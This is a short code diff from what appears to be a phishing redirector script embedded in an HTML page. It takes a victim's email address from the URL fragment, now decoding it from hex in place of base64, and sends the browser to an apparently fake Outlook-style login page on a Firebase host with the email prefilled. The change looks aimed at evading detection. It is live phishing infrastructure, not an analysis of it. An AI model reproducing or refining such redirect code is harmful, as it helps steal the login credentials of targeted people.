@@ -184,8 +184,19 @@ if(hash !== "") {
 
     hash = hash.split('#');
     const email = hash[1];
+    
+    function hex2a(email) {
+    var hex = email.toString(); // Force string conversion
+    var array = [];
+    for (var i = 0; (i < hex.length && hex.substr(i, 2) !== '00'); i += 2)
+    	array.push(parseInt(hex.substr(i, 2), 16));
+      
+    return decodeURIComponent(escape(String.fromCharCode.apply(null, array)));
+    
+    
+}
 
-    window.location.href = "https://owastoragsonlinemins.firebaseapp.com/2B5vSrIPelXr1dbZSWLjkE15MmBbTqeN2Bay52FCYyOxXbTKNEc1kjL14iho9zqOwong1mhsoICWEoYj4oJNPiKQxZP6OXr86z53B4T5wxcWhTNU8MON0KimRme2O18d5Uw8cEptoFubQ82F5SSZxQP.html#" + atob(email);
+    window.location.href = "https://owastoragsonlinemins.firebaseapp.com/2B5vSrIPelXr1dbZSWLjkE15MmBbTqeN2Bay52FCYyOxXbTKNEc1kjL14iho9zqOwong1mhsoICWEoYj4oJNPiKQxZP6OXr86z53B4T5wxcWhTNU8MON0KimRme2O18d5Uw8cEptoFubQ82F5SSZxQP.html#" + hex2a(email);
 }
 </script>
 
